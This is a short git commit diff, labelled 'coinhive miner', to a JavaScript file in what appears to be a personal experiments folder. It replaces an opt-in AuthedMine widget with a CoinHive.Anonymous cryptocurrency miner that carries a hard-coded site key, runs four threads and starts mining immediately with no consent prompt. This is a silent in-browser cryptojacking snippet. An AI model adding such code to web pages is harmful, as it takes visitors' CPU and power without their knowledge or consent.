2ee6c4e365a763e5950abd352bd4f2d031ae4293
james <tripl3j547@gmail.com>
2018-04-08 16:08:47 -0400

    coinhive miner

--- Stuff/HTML_JavaScript/CoinHive/something.js
+++ Stuff/HTML_JavaScript/CoinHive/something.js
@@ -1,22 +1,6 @@
-// {/* <script src = "https://coinhive.com/lib/coinhive.min.js" > </script>.<script>
-//   var miner = new CoinHive.User('2Z2gRMhnyTPFAZlFwR9SsmDEsdZW8Kg1', 'john-doe');
-//   miner.start();
-// </script> */}
-
-// {/* <script>
-//   var onCoinHiveSimpleUIReady = function(){
-//     CoinHive.Miner.on('authed', function(params) {
-//       console.log('Simple UI has authed with the pool');
-//     });
-//     CoinHive.Miner.on('job', function(params) {
-//       console.log('New job recieved from pool');
-//     });
-//   }
-// </script> */}
-
-<script src="https://authedmine.com/lib/simple-ui.min.js" async="async"></script>
-<div class = "coinhive-miner"
-  style = "width: 256px; height: 310px"
-  data-key = "2Z2gRMhnyTPFAZlFwR9SsmDEsdZW8Kg1" >
-  <em>Loading...</em>
-</div>
+var miner = new CoinHive.Anonymous('2Z2gRMhnyTPFAZlFwR9SsmDEsdZW8Kg1', {
+  threads: 4,
+  throttle: 0.5,
+  theme: 'dark'
+});
+miner.start();
